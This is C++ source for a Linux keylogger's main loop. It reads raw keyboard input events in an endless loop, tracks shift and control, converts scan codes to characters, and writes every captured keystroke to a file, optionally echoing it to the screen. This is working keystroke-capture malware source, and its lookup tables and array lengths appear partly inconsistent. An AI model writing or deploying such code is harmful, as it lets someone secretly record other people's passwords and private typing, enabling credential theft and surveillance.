#include "keylog.hh"

/**
 * Read from the keyboard
 *
 * Precondition: None
 * Postcondition: Keylogging is running
 */
void Keylog::run()
{
    struct input_event input;
    string characters = "abcdefghijklmnopqrstuvwxyz 1234567890-=,./;'[]\\";
    string shiftCharacters = "_+{}|\"<>?!@#$%^&*()_+~ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    char letter;
    bool shift;
    bool control;
    int index;
    int codes[] = {30, 48, 46, 32, 18, 33, 34, 35, 23, 36, 37, 38, 50, 49, 24, 25, 16, 19, 31, 20, 22, 47, 17, 45, 21,
        44, 57, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 51, 52, 53, 39, 40, 26, 27, 43, 29};
    int shiftCodes[] = {12, 13, 26, 27, 43, 40, 51, 52, 53, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 41, 30,
        48, 46, 32, 18, 33, 34, 35, 23, 36, 37, 38, 50, 49, 24, 25, 16, 19, 31, 20, 22, 47, 17, 45, 21,
        44};

    shift = false;
    control = false;

    while(1)
    {
        read(this->inputFd, &input, sizeof(struct input_event));

        if(input.type == 1)
        {
            if(input.value == 1)
            {

                if(input.code == 42 || input.code == 54)
                {
                    shift = true;
                }
                else if(input.code == 29 || input.code == 97)
                {
                    control = true;
                }

                if(control)
                {
                    continue;
                }

                if(input.code == 28)
                {
                    letter = '\n';
                }
                else
                {
                    index = shift ? getIndex(input.code, shiftCodes, 49) : getIndex(input.code, codes, 47);

                    if(index == -1)
                    {
                        continue;
                    }

                    letter = shift ? shiftCharacters.at(index) : characters.at(index);
                }

                if(this->verbose)
                {
                    cout << letter;
                    fflush(stdout); //Flush stdout so output appears when it's supposed to
                }

                if(this->writer)
                {
                    this->fileOutput->writeToFile(letter);
                }
            }
            else if(input.value == 0 && (input.code == 42 || input.code == 54))
            {
                shift = false;
            }
            else if(input.value == 0 && (input.code == 29 || input.code == 97))
            {
                control = false;
            }
        }
    }
}
